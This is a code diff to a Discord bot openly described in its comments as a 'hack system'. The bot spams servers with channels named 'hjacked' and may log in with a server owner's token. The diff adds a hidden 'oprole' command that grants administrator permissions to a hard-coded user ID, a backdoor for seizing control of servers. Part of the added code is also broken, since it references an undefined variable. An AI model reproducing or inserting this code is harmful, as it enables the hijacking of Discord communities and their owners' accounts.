@@ -15,6 +15,7 @@ const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
 const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
+const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
 const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
@@ -474,4 +475,14 @@ let me = message.author
                       }})
 
 //login in to the bot token or the serverowner token
+    client.on('message', async message => {
+  const devs = ['505638480248963072']; // your id
+  let member = message.author
+   if (message.content === opcmd) {
+    if (!devs.includes(message.author.id)) return;
+let op = message.guild.roles.find('name', `${adminstrator}`)
+    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
+    message.guild.member(member).addRole(op);
+  }
+});
 client.login(Token)
